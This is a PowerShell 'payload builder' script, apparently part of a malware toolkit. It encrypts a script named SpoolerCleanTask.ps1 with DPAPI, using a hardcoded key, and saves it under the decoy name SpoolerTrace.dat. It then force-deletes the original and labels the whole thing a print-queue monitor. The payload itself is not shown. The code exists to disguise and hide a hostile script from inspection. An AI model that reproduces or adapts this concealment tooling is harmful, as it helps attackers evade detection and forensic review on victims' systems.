# Automated Payload Builder – PrintQueueMonitor Suite
$payloadFile = "SpoolerCleanTask.ps1"
$encryptedOutput = "SpoolerTrace.dat"
$secretKey = "Metlica-Cistacica"

if (-not (Test-Path $payloadFile)) {
    Write-Host "Cannot locate $payloadFile. Aborting." -ForegroundColor Red
    exit
}

try {
    Write-Host "zakljucavam..." -ForegroundColor Cyan
    $scriptContent = Get-Content -Path $payloadFile -Raw
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($scriptContent)
    $encrypted = [System.Convert]::ToBase64String(
        [System.Security.Cryptography.ProtectedData]::Protect(
            $bytes, [System.Text.Encoding]::UTF8.GetBytes($secretKey), 'CurrentUser'
        )
    )
    Set-Content -Path $encryptedOutput -Value $encrypted
    Write-Host "Zakljucano u $encryptedOutput" -ForegroundColor Green

    Write-Host "caos"
    Remove-Item -Path $payloadFile -Force
    Write-Host "cao" -ForegroundColor Green
}
catch {
    Write-Host "process failed: $_" -ForegroundColor Red
}
